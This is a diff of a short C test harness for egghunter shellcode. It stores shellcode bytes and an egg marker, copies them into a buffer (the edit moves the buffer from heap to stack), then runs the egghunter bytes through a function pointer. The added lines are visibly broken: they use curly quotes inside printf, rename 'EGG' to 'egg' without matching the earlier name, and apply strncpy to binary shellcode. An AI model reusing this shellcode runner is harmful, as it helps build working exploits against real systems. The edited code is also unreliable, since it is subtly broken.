@@ -18,14 +18,11 @@ unsigned char shellcode[]=	"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08"
 main()
 {
 printf("Egghunter Length: %d\n", sizeof(egghunter) - 1);
-	char *heap;
-	heap=malloc(400);
-	memcpy(heap, EGG, 4);
-        memcpy(heap+4, EGG, 4);
-        memcpy(heap+4+4, shellcode, sizeof(shellcode));
-	printf("Memory location of Shellcode : %p\n", heap);
-	memcpy(heap+4+4+sizeof(shellcode), ptrn2, sizeof(ptrn2));
-	memcpy(heap+4+4+sizeof(shellcode)+sizeof(ptrn2), ptrn1, sizeof(ptrn1));
+	char stack[400];
+	printf(“Stack memory address of shellcode: %p\n”, stack);
+	strncpy(stack, egg, 4);
+	strncpy(stack+4, egg, 4);
+	strncpy(stack+4+4, shellegg, sizeof(shellegg));
 	int (*ret)() = (int(*)())egghunter;
 	ret();
 }
